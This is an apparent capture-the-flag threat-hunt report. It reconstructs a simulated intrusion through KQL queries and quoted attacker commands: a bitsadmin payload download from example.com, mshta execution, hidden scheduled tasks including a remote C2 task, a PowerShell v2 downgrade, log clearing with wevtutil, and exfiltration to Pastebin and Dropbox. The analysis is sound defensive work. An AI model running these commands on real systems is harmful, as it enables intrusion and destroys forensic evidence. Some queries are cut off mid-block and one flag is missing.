# üïµÔ∏è‚Äç‚ôÄÔ∏è Threat Hunt Report: **Lurker**

Analyst: Steven Cruz

Date Completed: 2025-07-07

Environment Investigated: michaelvm, centralsrvr

Timeframe: June 14 ‚Äì 18, 2025

## üß† Scenario Overview

What seemed like an isolated compromise may have been a smokescreen. An adversary has reemerged with improved evasion and more strategic objectives. This hunt follows a trail of suspicious PowerShell usage, financial document access, LOLBin abuse, and stealthy persistence across two systems: michaelvm and centralsrvr.

---

## üéØ Executive Summary
The investigation revealed a multi-stage intrusion beginning with malicious PowerShell activity on michaelvm, followed by credentialed lateral movement to centralsrvr, culminating in data exfiltration to cloud services including Google Drive, Dropbox, and Pastebin. The adversary utilized LOLBins for stealth, registry and scheduled tasks for persistence, and evaded logging with PowerShell v2 and wevtutil log clearing.

### ü™™ Flag 1 ‚Äì Initial PowerShell Execution

**Objective:**
Pinpoint the earliest suspicious PowerShell activity that marks the intruder‚Äôs possible entry.

**What to Hunt:**
Look for .ps1 script executions via powershell.exe, especially from user directories or with bypass flags.

**Identified Activity:**
"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"

**Why It Matters:**
This PowerShell command represents the earliest deviation from baseline behavior on the compromised host michaelvm. The use of -ExecutionPolicy Bypass indicates a deliberate attempt to circumvent PowerShell script restrictions ‚Äî a common tactic for initial payload deployment.

**KQL Query Used:**
```DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has ".ps1"
| where ProcessCommandLine has @"C:\users"
| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName

```
<img width="1365" height="221" alt="20ce57f6-0f45-4047-889e-2f914630ae0e" src="https://github.com/user-attachments/assets/ef26ada3-0725-405b-a08d-069b5dfcac98" />


### üõ∞Ô∏è Flag 2 ‚Äì Reconnaissance Script Hash

**Objective:**
Identify the reconnaissance-stage binary used by the attacker.

**What to Hunt:**
Execution of commands used to map out the environment, such as user/group enumeration.

**Identified Artifact:**

- Command:
"cmd.exe" /c "net group \" Domain Admins\""

- Initiating Process:
powershell.exe

- SHA256 Hash:
badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0

- Timestamp:
2025-06-16T05:56:59.4069248Z

**Why It Matters:**

**KQL Query Used**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine has "net"
| where ProcessCommandLine has "Domain"
| project Timestamp, DeviceName, ProcessCommandLine, SHA256, InitiatingProcessFileName
| sort by Timestamp asc
```
<img width="1462" height="184" alt="9ae6bc8f-29f2-4a58-9a1e-1cf42f9280c8" src="https://github.com/user-attachments/assets/ed4168d4-03b0-40bb-8bda-c32583d16069" />


### üìÑ Flag 3 ‚Äì Sensitive Document Access

**Objective:**
Reveal the document that was accessed or staged by the attacker.

**What to Hunt:**
Look for file access involving keywords like board, financial, or crypto ‚Äî especially in user folders.

**Identified File:**

- Filename: QuarterlyCryptoHoldings.docx

- Folder Path: C:\Users\Mich34L_id\Documents\BoardMinutes

- Device: michaelvm

**Why It Matters:**
The filename and directory strongly suggest the document contains sensitive financial information. This access aligns with a financially motivated threat actor and signals clear intent to gather valuable data for exfiltration.

**KQL Query Used:**
```
DeviceEvents
| where DeviceName == "michaelvm"
| where ActionType contains "SensitiveFileRead"
| where FolderPath contains "board"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath
```
<img width="1147" height="270" alt="f1c7b00f-1655-453f-ba7a-2d21bf07712c" src="https://github.com/user-attachments/assets/dc7d25e6-489d-490b-af0e-5153400fc4a2" />


### ‚è±Ô∏è Flag 4 ‚Äì Last Manual Access to File

**Objective:**
Track the last read of the sensitive document to establish the exfiltration timeline.

**What to Hunt:**
Look for the final SensitiveFileRead action tied to the previously identified file.

**Last Accessed File:**

- Filename: QuarterlyCryptoHoldings.docx

- Folder Path: C:\Users\Mich34L_id\Documents\BoardMinutes

- Device: michaelvm

- Timestamp: 2025-06-16T06:12:28.2856483Z

**Why It Matters:**
The document was last manually accessed just minutes before suspected payload activity and exfiltration, reinforcing its significance and timing in the attacker‚Äôs objective.

**Note:** While the KQL results display the last read event as occurring on June 15, the actual UTC timestamp is June 16. This is due to time zone display settings in the hunting interface vs. the UTC-based timestamp values in KQL.

**KQL Reference** (from previous flag):
```
DeviceEvents
| where DeviceName == "michaelvm"
| where ActionType contains "SensitiveFileRead"
| where FolderPath contains "board"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath
```
<img width="798" height="41" alt="cf45ac7b-93f4-40fe-9e1f-b458b6fa583a" src="https://github.com/user-attachments/assets/9dc346d0-db81-4f34-af8c-846ddd3fffb6" />


### ‚öôÔ∏è Flag 5 ‚Äì LOLBin Usage: bitsadmin

**Objective:**
Identify a stealthy download executed using native Windows utilities.

**What to Hunt:**
Look for executions of bitsadmin.exe with URLs and local paths ‚Äî common signs of file transfer abuse.

**Identified Command:**
"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe

**Why It Matters:**
bitsadmin.exe is a living-off-the-land binary (LOLBin) often abused by attackers to download payloads while bypassing traditional security tools. In this case, a file named crypto_toolkit.exe was silently fetched and stored as market_sync.exe in the user‚Äôs Temp directory ‚Äî an early-stage staging indicator.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "bitsadmin.exe"
| project Timestamp, DeviceName,FileName , ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```
<img width="1593" height="146" alt="8c64117d-905c-45e7-a06d-870483997136" src="https://github.com/user-attachments/assets/90c04309-ae3c-4937-a477-50bd1f00f80f" />


### üíæ Flag 6 ‚Äì Suspicious Payload Deployment

**Objective:**
Identify executable payloads dropped in nonstandard or staging directories.

**What to Hunt:**
Look for .exe files created in folders like Temp, AppData, or Downloads ‚Äî especially those with deceptive or business-related names.

**Identified Payload:**

- File Name: ledger_viewer.exe

- Folder Path: C:\Users\Mich34L_id\AppData\Local\Temp\ledger_viewer.exe

- Device: michaelvm

**Why It Matters:**
The executable ledger_viewer.exe appears financial in nature but was deployed into the user‚Äôs Temp directory, a common location used for staging malware. The naming suggests an attempt to blend in as a legitimate utility, aligning with pre-execution payload setup.

**KQL Query Used:**
```
DeviceFileEvents
| where DeviceName == "michaelvm"
| where FileName contains "ledger"
| where FileName contains "exe"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath
```

<img width="1177" height="90" alt="df258a37-6bd0-40a1-8d68-17c518e7f47a" src="https://github.com/user-attachments/assets/9e786a76-ae6e-4b73-b779-2b85d688c6c0" />


### üìé Flag 7 ‚Äì HTA Abuse via LOLBin

**Objective:**
Detect the execution of HTML Application (.hta) files using trusted Windows tools.

**What to Hunt:**
Look for execution of mshta.exe pointing to local .hta scripts, particularly those in Temp or AppData directories.

**Identified Command**
"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta

**Why It Matters:**
HTA files can embed VBScript or JavaScript and are executed by mshta.exe, a native Windows binary. This method is frequently used in social engineering attacks to bypass traditional script execution restrictions. In this case, the attacker leveraged a file named client_update.hta located in a Temp folder ‚Äî a strong signal of malicious intent.

KQL Query Used:
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where ProcessCommandLine contains "mshta.exe"
| project Timestamp, DeviceName, ProcessCommandLine
```

<img width="894" height="137" alt="fdcd5a52-b6e2-47c3-81b5-35e8ffa1054c" src="https://github.com/user-attachments/assets/69183010-6fa7-4e38-b64d-3829538e7775" />



### üóÇÔ∏è Flag 8 ‚Äì ADS Execution Attempt

**Objective:**
Track whether attackers used Alternate Data Streams (ADS) to hide or execute malicious payloads.

**What to Hunt:**
Look for .dll files appearing in suspicious paths (e.g., Temp folders), especially with filenames that resemble legitimate content (like reports or documents). These are often attached to other files or launched via trusted processes.

**Identified Artifact:**

- File Name: investor_report.dll

- Folder Path: C:\Users\Mich34L_id\AppData\Local\Temp\investor_report.dll

- Initiating Process: powershell.exe

- SHA1 Hash: 801262e122db6a2e758962896f260b55bbd0136a

- Timestamp: 2025-06-16T06:32:09.4710257Z

**Why It Matters:**
The DLL‚Äôs name ‚Äî investor_report.dll ‚Äî closely mimics a legitimate document title, likely as a disguise. Coupled with its placement in a Temp directory and launch via PowerShell, this strongly suggests it may have been used in an ADS-based or stealth execution technique. ADS attacks are commonly used to hide execution trails by appending malicious DLLs to innocuous file containers (e.g., document.docx:hidden.dll).

**KQL Query Used:**
```
DeviceFileEvents
| where Timestamp > datetime("2025-06-16T06:15:37.4710257Z")
| where DeviceName == "michaelvm"
| where FileName contains "dll"
| where FolderPath has @"C:\Users\Mich34L_id\AppData\Local\Temp"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, InitiatingProcessSHA1
```
<img width="612" height="261" alt="05cf2159-9c1c-4802-946f-d37a78ac5ab5" src="https://github.com/user-attachments/assets/b694fa48-e98e-49f7-97c8-15bea1fb55cf" />


### üóùÔ∏è Flag 9 ‚Äì Registry Persistence Confirmation

**Objective:**
Confirm that the attacker established persistence by writing to a registry autorun key.

**What to Hunt:**
Look for modification of autorun keys under HKCU\...\CurrentVersion\Run ‚Äî a common persistence technique that triggers script or binary execution at user logon.

**Identified Registry Entry:**

- Key Path:
HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

- Value Name: WalletUpdater

- Action Type: RegistryValueSet

- Initiating Process: powershell.exe

- Timestamp: 2025-06-16T06:41:24.1068836Z

- Device: michaelvm

**Why It Matters:**
Persistence via registry is a low-friction, high-reliability method that survives reboots and evades detection if disguised. The name WalletUpdater mimics legitimate crypto-related software, indicating social engineering or camouflage intent. This persistence path ensures the attack script or loader runs on each user session start.

**KQL Query Used:**
```
DeviceRegistryEvents
| where DeviceName == "michaelvm"
| where RegistryKey has @"Currentversion\run"
| project Timestamp, DeviceName, ActionType, RegistryKey, PreviousRegistryKey, RegistryValueName, PreviousRegistryValueName, InitiatingProcessCommandLine
```

<img width="1068" height="234" alt="24aabf33-c115-4f50-8776-75412ceb6a27" src="https://github.com/user-attachments/assets/12237500-7e73-4d93-b88d-513fd7ee17d8" />


### ‚è∞ Flag 10 ‚Äì Scheduled Task Execution

**Objective:**
Validate the scheduled task that launches the attacker‚Äôs payload.

**What to Hunt:**
Track the creation of scheduled tasks (schtasks.exe) with suspicious names or pointing to staging directories (e.g., Temp).

**Identified Scheduled Task:**

- Task Name: MarketHarvestJob

- Command Line: schtasks /Create /SC ONLOGON /TN "MarketHarvestJob" /TR powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta" /RL HIGHEST /F

- Folder Path: C:\Windows\System32\schtasks.exe

- Initiating Process: cmd.exe launched by powershell.exe

- Device: michaelvm

- Timestamp: 2025-06-15T19:52:39

**Why It Matters:**
The attacker created a scheduled task named MarketHarvestJob to persistently execute a malicious HTA file using powershell.exe. This task triggers on user logon, ensuring the payload re-executes even after reboots ‚Äî a common persistence mechanism seen in fileless malware deployments.

**Note:** The command uses multiple evasion techniques: -WindowStyle Hidden, -ExecutionPolicy Bypass, and placement in a trusted Temp directory to blend in and reduce detection risk.

**KQL Query Used:**
```
DeviceProcessEvents
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")
| where DeviceName == "michaelvm"
| where FileName contains "schtask"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessParentFileName
```

<img width="1655" height="525" alt="e607b4d1-a060-40e5-a3ce-ec0a64c76e15" src="https://github.com/user-attachments/assets/a70760a0-4f63-4155-9cd0-2762cd92e1d4" />



### üß≠ Flag 11 ‚Äì Target of Lateral Movement

**Objective:**
Identify which remote machine the attacker pivoted to after compromising the initial host.

**What to Hunt:**
Search for remote command-line operations, especially those involving /S and /U flags (remote system and user) within tools like schtasks.exe or wmic.exe.

**Identified Lateral Movement Target:**

- Remote System: centralsrvr

- Command Line: schtasks.exe /Create /S centralsrvr /U centralsrvr\\adminuser /P ********** /TN RemoteC2Task /TR "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\C2.ps1" /SC ONLOGON

- Originating Host: michaelvm

- Initiating Process: powershell.exe

- Initiating Parent: RuntimeBroker.exe

- Timestamp: 2025-06-16T08:32:34.9799062Z

**Why It Matters:**
The attacker attempted to remotely schedule a task on centralsrvr using valid admin credentials. This suggests either credential theft or insider access. The use of a PowerShell C2 script (C2.ps1) and placement in C:\Users\Public\ points to a stealthy, fileless command-and-control strategy. This marks initial lateral movement, indicating the breach is spreading.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")

### ‚è±Ô∏è Flag 12 ‚Äì Lateral Move Timestamp

**Objective:**
Pinpoint the exact time that lateral movement to the second host occurred.

**What to Hunt:**
Review command-line executions targeting remote systems using /S and /U, especially via tools like schtasks.exe. Focus on the last known timestamp that initiated remote actions.

**Identified Execution Time:**

- Timestamp: 2025-06-17T03:00:49.525038Z

- Remote System Targeted: centralsrvr

- Originating Host: michaelvm

- Process Used: schtasks.exe

**Why It Matters:**
This timestamp marks the last recorded instance of lateral activity from the compromised michaelvm system. It provides a critical anchor point for reconstructing the adversary's timeline, containment actions, and correlation with further compromise events on centralsrvr.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "michaelvm"
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")

### üìÇ Flag 13 ‚Äì Sensitive File Access

**Objective:**
Reveal which specific document the attacker targeted on the second host.

**What to Hunt:**
Search for access to high-value or confidential documents, particularly those that match known filenames or hashes from previous host compromises.

**Confirmed Sensitive File Accessed:**

- Filename: QuarterlyCryptoHoldings.docx

- SHA256 Hash: b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98

- Folder Path: C:\Users\centralsrvrID\Documents\BoardMinutes\QuarterlyCryptoHoldings.docx

- Access Type: SensitiveFileRead

- Timestamp: 2025-06-17T22:23:24Z

- Target Host: centralsrvr

- Remote Session Origin: MICHA3L

**Why It Matters:**
The attacker specifically sought the same financial document (QuarterlyCryptoHoldings.docx) that was previously accessed on michaelvm. This continuity strongly implies the adversary had a defined financial motive and confirms lateral access was not opportunistic ‚Äî it was goal-oriented data theft.

**KQL Queries Used:**
```
DeviceEvents
| where DeviceName == "centralsrvr"
| where Timestamp > datetime("2025-06-16T06:41:24.1068836Z")

### ‚òÅÔ∏è Flag 14 ‚Äì Data Exfiltration Attempt

**Objective:**
Validate that outbound activity occurred, and determine which process was responsible for initiating the exfiltration.

**What to Hunt:**
Outbound network connections to cloud storage or paste services ‚Äî particularly with valid InitiatingProcessMD5 values that point to suspicious or newly observed binaries.

**Confirmed Exfiltration Behavior:**

MD5 Hash: 2e5a8590cf6848968fc23de3fa1e25f1

**Remote URLs Accessed:**

- drive.google.com

- dropbox.com

- www.dropbox.com

- pastebin.com

**Remote Session Origin:** MICHA3L

**Device:** centralsrvr

**Timestamps:**

2025-06-17T22:23:24Z ‚Üí Google Drive

2025-06-17T22:23:28Z ‚Üí Dropbox (2 entries)

2025-06-17T22:23:31Z ‚Üí Pastebin

**Why It Matters:**
The repeated outbound traffic to Google Drive, Dropbox, and Pastebin confirms that data was likely exfiltrated using trusted cloud services. The process responsible (based on the matching MD5) was consistently active across multiple destinations in rapid succession ‚Äî indicating automation or scripted behavior.

This type of behavior is common in attacks involving:

- Command-and-control (C2) over legitimate platforms

- Data exfiltration masquerading as routine cloud traffic

- Anti-detection via encrypted TLS channels

**Confirmed Exfiltration Endpoint:**

- Remote IP: 104.22.69.199

- Resolved Domain: pastebin.com

- Device: centralsrvr

- Session Origin: MICHA3L

- Timestamp: 2025-06-17T22:23:31Z

**Why It Matters:**
The IP 104.22.69.199 is associated with pastebin.com, a common data dump and exfiltration site abused by attackers due to its anonymity and accessibility. This connection marks the final confirmed outbound transmission, likely containing sensitive financial data previously accessed.

This finding validates:

- The attacker used Pastebin as an exfiltration destination.

- The same process that initiated connections to Google Drive and Dropbox (see Flag 14) also ended the operation here.

- Timeline correlation can help identify full data loss scope and inform incident containment and forensics review.

### üß¨ Flag 16 ‚Äì PowerShell Downgrade Detection

**Objective:**
Detect the use of PowerShell version downgrade flags (-Version 2), often used to evade logging mechanisms like AMSI and Script Block Logging.

**What to Hunt:**
Command-line execution of powershell.exe with the -Version 2 parameter, which forces the session into legacy compatibility mode and bypasses modern security instrumentation.

**Confirmed Downgrade Attempt:**

- Timestamp: 2025-06-18T10:52:59.0847063Z

- Device: centralsrvr

- Command Line: powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -NoExit

- Remote Session Origin: MICHA3L

**Why It Matters:**
PowerShell v2 lacks critical security features such as:

- Script Block Logging

- AMSI Integration

- Module Logging

This downgrade attempt is a clear evasion tactic, often used in advanced persistent threat (APT) operations and red team simulations. Its presence strongly suggests an effort to avoid detection during payload execution or lateral scripting.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine contains "-Version 2"
| project Timestamp, DeviceName, ProcessCommandLine, ProcessRemoteSessionDeviceName
```

### üßπ Flag 17 ‚Äì Log Clearing Attempt

**Objective:**
Detect if the attacker attempted to clear system logs to destroy forensic evidence and cover their tracks.

**What to Hunt:**
Look for execution of: wevtutil cl Security

This command clears the Security Event Log, which contains crucial evidence such as logon events, privilege escalations, and policy changes.

**Confirmed Log Wipe Action:**

- Process: wevtutil.exe

- Command Line: wevtutil.exe cl Security

- Process Creation Timestamp: 2025-06-18T10:52:33.3030998Z

- Device: centralsrvr

- Remote Session Origin: MICHA3L

**Why It Matters:**
Clearing logs is an overt attempt to erase visibility into prior attacker activity. It‚Äôs often the last move before exfiltration or attacker exit, especially in hands-on-keyboard intrusions. This event signals a shift from persistence to cleanup and departure, and it must be treated as an urgent containment and recovery milestone.

**KQL Query Used:**
```
DeviceProcessEvents
| where DeviceName == "centralsrvr"
| where ProcessCommandLine contains "cl Security"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, ProcessCreationTime, ProcessRemoteSessionDeviceName
```

| **Victim**         | - Initial: `michaelvm` (entry point)<br>- Lateral: `centralsrvr`<br>- Targeted files: `QuarterlyCryptoHoldings.docx` on both machines<br>- Sensitive folder paths and scheduled tasks abused for persistence and access.                 |
---
## üí° Key Relationships:
- Adversary used capability (PowerShell, LOLBins, recon, persistence) on victim (michaelvm, then centralsrvr)

- Adversary leveraged infrastructure (public cloud services + native tools) to exfiltrate data

- Capability enabled movement from initial compromise to expansion and cleanup

---

## ‚úÖ Conclusion

The Lurker threat scenario exposed a stealthy multi-phase intrusion that began with the abuse of PowerShell and native Windows tools and evolved into a targeted data exfiltration campaign. The adversary executed with precision, leveraging legitimate binaries (LOLBins), social engineering payloads, registry and scheduled task persistence, and evasion techniques such as PowerShell version downgrades and event log clearing.

Through forensic analysis of process events, file reads, registry changes, and network activity, we successfully reconstructed the adversary‚Äôs kill chain across two compromised systems: michaelvm and centralsrvr.

---

## üß† Lessons Learned
- **Initial Access Often Mimics Legitimate Use**
  
 PowerShell activity from user folders with policy bypass flags should raise alerts even when they look routine.

- **LOLBin Abuse Is a Persistent Risk**

 Adversaries increasingly favor native tools (bitsadmin, mshta, wevtutil) to avoid detection by EDRs.

- **Persistence Tactics Are Layered**

 Registry keys and scheduled tasks were both used, ensuring the attacker maintained control across reboots.

- **Cloud Services Can Be Used for Exfiltration**

 Dropbox, Google Drive, and Pastebin were all leveraged for outbound data transfers, evading traditional filters.

- **Downgrade Attacks Undermine Modern Logging**

 PowerShell downgrade to Version 2 disabled script block logging and AMSI defenses.

- **Cleaning Logs ‚â† Cleaning Up**

 Even though logs were cleared, timestamps and forensic remnants allowed a full attack reconstruction.

---

## üõ° Remedial Actions
1. **Enhance PowerShell Monitoring**

- Enforce Constrained Language Mode

- Block execution of PowerShell v2 where possible

- Enable deep script block logging and central collection

2. **Detect and Block LOLBin Abuse**

- Alert on uncommon use of mshta.exe, bitsadmin.exe, and wevtutil.exe

- Use allow-listing to limit legitimate LOLBin usage

3. **Harden Persistence Defenses**

- Monitor HKCU\Software\Microsoft\Windows\CurrentVersion\Run

- Detect suspicious scheduled task creation by non-admin users

4. **Restrict Outbound Access to Known Cloud Services**

- Block access to file-sharing platforms not explicitly approved (e.g., Dropbox, Pastebin)

- Use CASB or DLP to inspect cloud-bound traffic

5. **Implement Lateral Movement Protections**

- Audit schtasks.exe usage with remote /S flag

- Require MFA and remove excessive admin privileges

6. **Automate Log Integrity Verification**

- Set alerts for wevtutil cl activity

- Forward logs to a secure, remote SIEM that is tamper-resistant
